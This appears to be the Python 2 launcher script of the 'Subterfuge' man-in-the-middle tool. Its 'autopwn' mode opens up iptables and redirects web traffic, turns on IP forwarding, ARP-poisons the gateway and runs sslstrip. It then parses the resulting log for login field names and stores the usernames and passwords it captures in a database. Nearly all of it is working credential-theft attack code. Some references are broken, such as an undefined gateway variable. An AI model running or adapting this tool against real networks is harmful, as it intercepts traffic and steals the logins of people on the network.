#!/usr/bin/python
import os
import re
import sys
import time
import datetime
import urllib

"""
  #Ignore Deprication Warnings
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning) 

from django.conf import settings
settings.configure(DATABASE_ENGINE="sqlite3",
                   DATABASE_HOST="",
                   DATABASE_NAME= os.path.dirname(__file__) + "/db",
                   DATABASE_USER="",
                   DATABASE_PASSWORD="")

from django.db import models
from main.models import *
"""
try:

	def main():

		#Checks for sane arguments
		if len(sys.argv) != 2:
			usage()
	
		#Help menu
		if sys.argv[1] == "-h" or sys.argv[1] == "--help":
			arpspoof()
			print "\nSubterfuge courtesy of r00t0v3rr1d3 & 0sm0s1z \n"
			print "Usage: python mitm.py [OPTIONS] \n"
			print "HELP MENU:"
			print "Attack Options:"
			print "   -a,--autopwn 		autopwn"
			print "\nConfiguration Options:"
			print "   -c,--configure 		autoconfigure harvester 2"
			print "   -h,--help 			display this message"
			##########################################################################

		#Autopwn menu
		elif sys.argv[1] == "-a" or sys.argv[1] == "--autopwn":
			print "Automatically Configuring Subterfuge..."
	      		config()
			print "Initiating ARP Poison With ARPMITM..."
			arpspoof()
			print "Starting up SSLstrip..."
			sslstrip()
			print "Harvesting Credentials..."
			harvest()
	
		#Configure Menu
		elif sys.argv[1] == "-c" or sys.argv[1] == "--configure":
			print "Automatically Configuring Subterfuge..."
			config()
		
		#Display proper usage instructions
		else:
			usage()
	
	#Set system configuration to perform MITM Attacks
	def config():
		os.system('iptables -F')
		os.system('iptables -X')
		os.system('iptables -t nat -F')
		os.system('iptables -t nat -X')
		os.system('iptables -t mangle -F')
		os.system('iptables -t mangle -X')
		os.system('iptables -P INPUT ACCEPT')
		os.system('iptables -P FORWARD ACCEPT')
		os.system('iptables -P OUTPUT ACCEPT')
		time.sleep(1)
		os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 	10000')
		time.sleep(1)
		print "Iptables Prerouting Configured\n"
	
		print 'Configuring System...'
		os.system('sysctl -w net.ipv4.ip_forward=1')
	        print "IP Forwarding Enabled."
	
		#ARP Cache Poison through Subterfuge:
	def arpspoof():
		command = 'python ' + os.path.dirname(os.path.abspath(__file__)) + '/utilities/arpmitm.py ' + gateway + ' &'
		os.system(command)
	
	#SSLStrip tooled through Subterfuge:
	def sslstrip():
	 	#run sslstrip
		os.system('python ' + os.path.dirname(__file__) + '/sslstrip.py -w ' + os.path.dirname(__file__) + '/sslstrip.log -l 10000 -f &')
		#-a includes all traffic not just https post requests
	
	#Edits logs to gather credentials
	def harvest():
		print "Harvesting Credentials..."

		#Read in username fields from definitions file
		u = open(os.path.dirname(__file__) + '/definitions/usernamefields.lst', 'r')
		username = u.readlines()
		#Remove all of the new line characters
		tmplst = []
		for h in username:
			tmplst.append(h.rstrip('\n'))
		username = tmplst
		username.remove('')

		#Read in password fields from definitions file
		p = open(os.path.dirname(__file__) + '/definitions/passwordfields.lst', 'r')
		password = p.readlines()
		tmplst2 = []
		#Remove all of the new line characters
		for g in password:
			tmplst2.append(g.rstrip('\n'))
		password = tmplst2
		password.remove('')
		
		os.system("echo > " + os.path.dirname(__file__) + "/sslstrip.log")
		log = open(os.path.dirname(__file__) + "/sslstrip.log")

		while 1:
			line = log.readline()
	
			if len(line) == 0:
				os.system('echo > ' + os.path.dirname(__file__) + '/sslstrip.log')
				time.sleep(5)

			user = 'Unknown'
			passwd = 'Unknown'
			source = 'Unknown'
			for i in username:
				if (line.find(i) >= 0): #if it is in the string
					#parse for host
					hoststr = re.findall(r'\(.*?\):', line)
					if (len(hoststr) > 0):
						host = hoststr[0].partition('(')
						hoststr = host[2]
						host = hoststr.partition(')')
						hoststr = host[0]
						source = hoststr

					#parse for the username
					tmpstr = line.partition(i)
					usrpassend = tmpstr[2]
					usrs = []
					usrs.append(usrpassend)
					boolu = 1
					while (boolu):
						if (usrpassend.find(i) >= 0):
							tmpstr = usrpassend.partition(i)
							usrpassend = tmpstr[2]
							usrs.append(usrpassend)
						else:
							boolu = 0

					newusrs = []
					for num in usrs:					
						usrn = re.findall(r'=(.*?)&', num)
						if (len(usrn)):
							if (len(usrn[0]) > 2 and len(usrn[0]) < 46 and usrn[0] != 'adtoken'):
								#print 'added ' + usrn[0]
								newusrs.append(usrn[0])
					
					if (len(newusrs) > 0):
						user = newusrs.pop((len(newusrs) -1))
						user = urllib.unquote(user)
						#print user	
						#begin password section
						for j in password:
							if (line.find('&' + j) >= 0): #if it is in the string
								#parse for the password
								tmpstr2 = line.partition(j)
								passend = tmpstr2[2]
								passes = []
								passes.append(passend)
								boolu2 = 1
								while (boolu2):
									if (passend.find(j) >= 0):
										tmpstr2 = passend.partition(j)
										passend = tmpstr2[2]
										passes.append(passend)
									else:
										boolu2 = 0

								newpasses = []
								for num2 in passes:					
									pas = re.findall(r'=(.*?)&', num2)
									if (len(pas)):
										if (len(pas[0]) > 2 and len(pas[0]) < 46):
											newpasses.append(pas[0])
					
								if (len(newpasses) > 0):
									passwd = newpasses.pop((len(newpasses) -1))
									passwd = urllib.unquote(passwd)
									#print passwd
									reap(source, user, passwd)
									#to prevent duplicate entries being found
									line = ''
								else:
									newpasses2 = []
									for num3 in passes:					
										pas2 = re.findall(r'=(.*?)\n', num3)
										if (len(pas2)):
											if (len(pas2[0]) > 2 and len(pas2[0]) < 46):
												newpasses2.append(pas2[0])
									if (len(newpasses2) > 0):
										passwd = newpasses2.pop((len(newpasses2) -1))
										passwd = urllib.unquote(passwd)
										#print passwd
										reap(source, user, passwd)
										#to prevent duplicate entries being found
										line = ''



	#insert into database
	def reap(source, username, password):
		now = datetime.datetime.now()
		date = now.strftime("%d-%m-%Y %H:%M")
		logcred = credentials(source = source, username = username, password = password, date = date)
		logcred.save()

	def usage(): 
	
		print "\nSubterfuge courtesy of r00t0v3rr1d3 & 0sm0s1z \n"
		print "Usage: subterfuge [OPTIONS] \n"
		sys.exit(1)
	 
	if __name__ == '__main__':
	    main()				

except KeyboardInterrupt:
	print 'Cleaning up...'
	time.sleep(1)	
	os.system("kill -9 `ps -A 1 | sed -e '/arpmitm/!d;/sed -e/d;s/^ //;s/ pts.*//'`")
	os.system("kill -9 `ps -A 1 | sed -e '/sslstrip/!d;/sed -e/d;s/^ //;s/ pts.*//'`")
	time.sleep(2)
	os.system("kill -9 `ps -A 1 | sed -e '/armmitm/!d;/sed -e/d;s/^ //;s/ pts.*//'`")
	os.system("kill -9 `ps -A 1 | sed -e '/sslstrip/!d;/sed -e/d;s/^ //;s/ pts.*//'`")
	time.sleep(2)
